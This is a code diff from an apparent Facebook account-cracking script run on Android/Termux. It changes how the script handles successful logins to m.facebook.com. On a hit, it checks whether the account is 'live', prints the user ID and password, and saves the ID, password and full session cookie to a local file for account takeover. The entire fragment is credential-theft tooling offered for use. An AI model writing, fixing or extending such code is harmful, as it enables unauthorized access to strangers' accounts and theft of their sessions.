@@ -1390,14 +1390,18 @@ def mbasic(uid,pwx,tl):
             '__user': dict(requests.cookies)['c_user']}
             url = 'https://m.facebook.com/confirmation_cliff/'
             response = Session.post(url, headers=headers, data=data)
-            dc=dict(Session.cookies)
-            cok=";".join([k+"="+v for k,v in dc.items()])
-            uid=re.findall("c_user=(.*?);",cok)[0]
-            coki = cvt('ok',Session.cookies.get_dict())+"dpr=2;locale=en_US;wd=950x1835;m_page_voice="+uid
-            print("\r\r\033[1;32m [OK] "+uid+'|'+pw+'|'+coki)
-            open(file,"a").write(uid+"|"+pw+"|"+coki+"\n")
-            oks.append(uid)
-            break
+            response = Session.cookies.get_dict().keys()
+            if "c_user" in response:
+                cok = Session.cookies.get_dict()
+                cid = cok["c_user"]
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                check = check_lock(cid)
+                if "live" in check:
+                    print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                    open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                    break
+                else:
+                    break
         loop+=1
     except ce:
         time.sleep(20)
